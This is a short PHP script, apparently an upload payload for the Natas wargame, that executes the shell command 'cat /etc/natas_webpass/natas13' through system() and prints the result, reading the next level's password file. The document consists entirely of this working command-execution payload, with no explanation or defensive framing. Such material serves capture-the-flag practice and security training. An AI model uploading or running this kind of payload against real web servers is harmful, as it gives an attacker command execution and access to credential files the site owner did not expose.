<?php

$output = system("cat /etc/natas_webpass/natas13", $return_value);

echo $output;
echo "\n\n\n";
echo $return_value;

?>
